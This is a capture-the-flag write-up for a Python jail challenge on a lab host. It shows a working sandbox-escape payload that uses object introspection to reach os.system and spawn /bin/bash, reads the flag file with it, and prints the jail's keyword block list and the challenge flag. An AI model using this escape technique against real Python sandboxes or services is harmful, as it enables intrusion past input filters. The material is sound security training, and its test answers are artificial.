# Snake Game

## Challenge

Hi, TCC-CSIRT analyst,

Snakes are wonderful creatures, and everyone loves them. Many people enjoy playing with snakes and find them fascinating companions. One of them lives on `snakegame.leisure.tcc` on port `23001/TCP`.

See you in the next incident!

Hint: The snake is actually a Python.

## Solution

The challenge involves interacting with a Python-based input validator that restricts the use of certain keywords like `eval`, `import`, `os`, and others. We explored ways to bypass these restrictions and ultimately obtain the flag.

### 1. Initial Exploration

We tried several methods that were blocked:

```bash
nc snakegame.leisure.tcc 23001
Hello, I can only speak Python, show me your code.
Enter your code : __import__('os')
This is not allowed: import
```

Similarly, using eval was blocked:

```bash
nc snakegame.leisure.tcc 23001
Hello, I can only speak Python, show me your code.
Enter your code : eval(input())
This is not allowed: eval
```

### 2. Bypassing Restrictions with Object Introspection

We were able to bypass the input validation using object introspection to access Python internals and execute commands:

```bash
nc snakegame.leisure.tcc 23001
Hello, I can only speak Python, show me your code.
Enter your code : ().__class__.__mro__[1].__subclasses__()[140].__init__.__globals__["System".lower()]("/bin/bash")
```

Once we obtained a shell, we explored the file system and discovered the `/flag.txt` file but reading it directly with cat didn't work (maybe cat not available).

### 3. Printing The Flag

To print the flag, we invoked Python and read the flag:

```bash
nc snakegame.leisure.tcc 23001
Hello, I can only speak Python, show me your code.
Enter your code : ().__class__.__mro__[1].__subclasses__()[140].__init__.__globals__["System".lower()]("/bin/bash")

python -c "print(open('/flag.txt').read())"
FLAG{lY4D-GJaQ-VUks-PNQd}
```

We also inspected the jail's Python code:

```python
import string

print('Hello, I can only speak Python, show me your code.')
code = input('Enter your code : ')
code = ''.join([c for c in code if c in string.printable])
for keyword in ['eval', 'exec', 'import', 'open', 'system', 
                'os', 'builtins', "'", '""', '+', '*' ]:
    if keyword in code:
        print('This is not allowed:', keyword)
        break
else:
    try:
        print(eval(code, {'__builtins__': {'str': str}}))
    except Exception as e:
        print(f'I\'m confused - {e}')
```

## Flag

```
FLAG{lY4D-GJaQ-VUks-PNQd}
```
